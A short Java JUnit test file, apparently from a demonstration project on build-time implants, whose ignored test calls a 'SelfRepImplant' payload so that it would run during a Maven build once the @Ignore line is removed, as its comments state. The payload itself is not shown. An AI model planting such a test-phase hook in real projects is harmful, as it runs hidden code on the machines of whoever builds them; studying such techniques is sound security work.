package org.example.implants;

import org.junit.Ignore;
import org.junit.Test;

public class DetonateDuringTests {
    @Test
    @Ignore // Comment or remove this line to make this a very malicious Maven project
    public void testDetonate() {
        // This one ignores CONF_RUN_FROM_MAIN (that conf is meant for spiked executions)
        SelfRepImplant.create().payload();  // BOOM!
    }
}
